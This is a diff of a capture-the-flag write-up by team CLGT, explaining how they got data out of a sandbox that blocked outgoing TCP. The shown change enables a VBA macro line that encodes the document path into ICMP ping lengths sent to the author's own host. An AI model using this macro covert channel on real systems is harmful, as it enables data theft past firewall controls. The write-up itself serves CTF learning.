@@ -1,4 +1,4 @@
-My team, CLGT.
+We made it to top 10, Team CLGT !
 
 Description:
 
@@ -22,7 +22,7 @@ First guess was, ping to home
 
 TCPDUMP from home with ICMP on. Bingo, packet received. We went and wrote few more connection script like email and web. Looks like we got no luck at all. So we concluded,
 
-- NO Outgoing TCP Allowed (** ppp solved it with DNS)
+- No Outgoing TCP Allowed (** ppp solved it with DNS Query)
 
 Looks like ICMP able to to go out from the box. So, we did another test.
 
@@ -33,14 +33,14 @@ And we received
 > 11:29:43.643405 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2249, length 10
 
 This is clear that we can somehow use the length to pass some data. So, first thing is. We want to know where are we.
+
 ```
 strString = (ActiveDocument.Path)
 For i = 1 To Len(strString)
     strHex = Hex(Asc(Mid(strString, i, 1)))
     strDec = CLng("&h" & strHex)
     strDec = strDec - 8
-    MsgBox (strDec)
-    'Shell ("ping -n 1 -l " & strDec & " my.ip.add.ress")
+    Shell ("ping -n 1 -l " & strDec & " my.ip.add.ress")
 Next
 ```
 
